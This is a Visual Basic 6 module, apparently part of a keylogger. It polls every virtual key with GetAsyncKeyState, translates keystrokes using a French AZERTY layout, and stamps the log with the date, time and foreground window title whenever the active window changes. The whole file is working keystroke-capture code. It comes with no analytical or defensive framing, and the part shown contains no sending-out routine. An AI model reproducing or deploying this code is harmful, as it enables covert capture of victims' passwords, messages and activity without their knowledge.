Attribute VB_Name = "Module2"
Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Public Declare Function GetForegroundWindow Lib "user32.dll" () As Long
Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Public Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Public Const Pressed = -32767
Public Wind As String 'last window
Function GetCaption(hWnd As Long)
Dim hWndlength As Long, hWndTitle As String, A As Long
hWndlength = GetWindowTextLength(hWnd)
hWndTitle = String$(hWndlength, 0)
A = GetWindowText(hWnd, hWndTitle, (hWndlength + 1))
GetCaption = hWndTitle
End Function
Function GetKey() As String
'On Error Resume Next 'Errors? Impossible! but anyway =)
Dim CapsLock As Integer
Dim Alt As Integer
Dim Shift As Integer
'Loop to get pressed key
For x = 1 To 255
If GetAsyncKeyState(x) = Pressed Then
GetKey = x
'Get capslock,numlock and numlock
If GetKeyState(vbKeyCapital) = -127 Or GetKeyState(vbKeyCapital) = 1 Then CapsLock = 1 Else CapsLock = 0
If GetAsyncKeyState(16) = -32768 Then Shift = 1 Else Shift = 0
If GetAsyncKeyState(18) = -32768 Then Alt = 1 Else Alt = 0
'Check if >>Character<< is pressed
If x >= 65 And x <= 90 Then
If CapsLock = 1 And Shift = 0 Then GetKey = Chr(x)
If CapsLock = 0 And Shift = 0 Then GetKey = Chr(x + 32)
If CapsLock = 0 And Shift = 1 Then GetKey = Chr(x)
If CapsLock = 1 And Shift = 1 Then GetKey = Chr(x + 32)
End If
If x = 160 Then GetKey = ""
If x = 161 Then GetKey = ""
If x = 165 Then GetKey = ""
If x = 20 Then GetKey = ""
'Symboles
Select Case x
Case 186
If Shift = 1 Then GetKey = "£"
If Alt = 1 Then GetKey = "¤"
If Shift = 0 And Alt = 0 Then GetKey = "$"
End Select

Select Case x
Case 50
If Shift = 1 Then GetKey = "2"
If Alt = 1 Then GetKey = "~"
If Shift = 0 And Alt = 0 Then GetKey = "é"
End Select

Select Case x
Case 51
If Shift = 1 Then GetKey = "3"
If Alt = 1 Then GetKey = "#"
If Shift = 0 And Alt = 0 Then GetKey = """"
End Select

Select Case x
Case 52
If Shift = 1 Then GetKey = "4"
If Alt = 1 Then GetKey = "{"
If Shift = 0 And Alt = 0 Then GetKey = "'"
End Select

Select Case x
Case 53
If Shift = 1 Then GetKey = "5"
If Alt = 1 Then GetKey = "["
If Shift = 0 And Alt = 0 Then GetKey = "("
End Select

Select Case x
Case 54
If Shift = 1 Then GetKey = "6"
If Alt = 1 Then GetKey = "|"
If Shift = 0 And Alt = 0 Then GetKey = "-"
End Select

Select Case x
Case 55
If Shift = 1 Then GetKey = "7"
If Alt = 1 Then GetKey = "`"
If Shift = 0 And Alt = 0 Then GetKey = "è"
End Select

Select Case x
Case 56
If Shift = 1 Then GetKey = "8"
If Alt = 1 Then GetKey = "\"
If Shift = 0 And Alt = 0 Then GetKey = "_"
End Select

Select Case x
Case 57
If Shift = 1 Then GetKey = "9"
If Alt = 1 Then GetKey = "^"
If Shift = 0 And Alt = 0 Then GetKey = "ç"
End Select

Select Case x
Case 48
If Shift = 1 Then GetKey = "0"
If Alt = 1 Then GetKey = "@"
If Shift = 0 And Alt = 0 Then GetKey = "à"
End Select

Select Case x
Case 219
If Shift = 1 Then GetKey = "°"
If Alt = 1 Then GetKey = "]"
If Shift = 0 And Alt = 0 Then GetKey = ")"
End Select

Select Case x
Case 187
If Shift = 1 Then GetKey = "+"
If Alt = 1 Then GetKey = "}"
If Shift = 0 And Alt = 0 Then GetKey = "="
End Select


If x = 49 Then If Shift = 0 Then GetKey = "&" Else GetKey = "1"
'If x = 186 Then If Shift = 0 Then GetKey = "$" Else GetKey = "£"
If x = 192 Then If Shift = 0 Then GetKey = "ù" Else GetKey = "%"
If x = 220 Then If Shift = 0 Then GetKey = "*" Else GetKey = "µ"
If x = 188 Then If Shift = 0 Then GetKey = "," Else GetKey = "?"
If x = 190 Then If Shift = 0 Then GetKey = ";" Else GetKey = "."
If x = 191 Then If Shift = 0 Then GetKey = ":" Else GetKey = "/"
If x = 223 Then If Shift = 0 Then GetKey = "!" Else GetKey = "§"
If x = 226 Then If Shift = 0 Then GetKey = "<" Else GetKey = ">"


If x = 49 Then If Shift = 0 Then GetKey = "&" Else GetKey = "1"
'Constants (will not change if alt/caps/shift is pressed)
If x = 1 Then GetKey = "[LeftMouse]" & vbCrLf
If x = 2 Then GetKey = "[RightMouse]" & vbCrLf
If x = 3 Then GetKey = "[MiddleMouse]" & vbCrLf
If x = 8 Then GetKey = "[BackSpace]" & vbCrLf
If x = 9 Then If Shift = 0 Then GetKey = "[Tab]" Else GetKey = "[Tab inv]" & vbCrLf
If x = 12 Then GetKey = ""
If x = 13 Then GetKey = "<-|" & vbCrLf  '"[Return]"
If x = 19 Then GetKey = "[Pause]" & vbCrLf
If x = 27 Then GetKey = "[Esc]" & vbCrLf
If x = 32 Then GetKey = " "
If x = 33 Then GetKey = "[PgUp]" & vbCrLf
If x = 34 Then GetKey = "[PgDn]" & vbCrLf
If x = 35 Then GetKey = "[Fin]" & vbCrLf
If x = 36 Then GetKey = "[Home]" & vbCrLf
If x = 37 Then GetKey = "[Left]" & vbCrLf
If x = 38 Then GetKey = "[Up]" & vbCrLf
If x = 39 Then GetKey = "[Right]" & vbCrLf
If x = 40 Then GetKey = "[Down]" & vbCrLf
If x = 44 Then GetKey = "[Impr.écran]" & vbCrLf
If x = 45 Then GetKey = "[Insert]" & vbCrLf
If x = 46 Then GetKey = "[Del]" & vbCrLf
If x = 91 Then GetKey = "[LeftWinButton]" & vbCrLf
If x = 92 Then GetKey = "[RightWinButton]" & vbCrLf
If x = 93 Then GetKey = "[Menu]" & vbCrLf
If x = 96 Then GetKey = "0"
If x = 97 Then GetKey = "1"
If x = 98 Then GetKey = "2"
If x = 99 Then GetKey = "3"
If x = 100 Then GetKey = "4"
If x = 101 Then GetKey = "5"
If x = 102 Then GetKey = "6"
If x = 103 Then GetKey = "7"
If x = 104 Then GetKey = "8"
If x = 105 Then GetKey = "9"
If x = 106 Then GetKey = "*"
If x = 107 Then GetKey = "+"
If x = 109 Then GetKey = "-"
If x = 110 Then GetKey = "."
If x = 111 Then GetKey = "/"
If x = 112 Then GetKey = "[F1]" & vbCrLf
If x = 113 Then GetKey = "[F2]" & vbCrLf
If x = 114 Then GetKey = "[F3]" & vbCrLf
If x = 115 Then GetKey = "[F4]" & vbCrLf
If x = 116 Then GetKey = "[F5]" & vbCrLf
If x = 117 Then GetKey = "[F6]" & vbCrLf
If x = 118 Then GetKey = "[F7]" & vbCrLf
If x = 119 Then GetKey = "[F8]" & vbCrLf
If x = 120 Then GetKey = "[F9]" & vbCrLf
If x = 121 Then GetKey = "[F10]" & vbCrLf
If x = 122 Then GetKey = "[F11]" & vbCrLf
If x = 123 Then GetKey = "[F12]" & vbCrLf
If x = 145 Then GetKey = "[arrêt défil]" & vbCrLf
If x = 162 Then GetKey = "[LeftCtrl]" & vbCrLf
If x = 163 Then GetKey = "[RightCtrl]" & vbCrLf
If x = 222 Then GetKey = "²"
If x = 144 Then GetKey = "[Verr.num]" & vbCrLf
If x = 164 Then GetKey = "[Alt]" & vbCrLf
End If
Next x
'Get the active window

If Not Wind = GetCaption(GetForegroundWindow) Then
Wind = GetCaption(GetForegroundWindow)
GetKey = GetKey & Date & " - " & Time & " --< " & Wind & " >--" & vbCrLf
End If
End Function


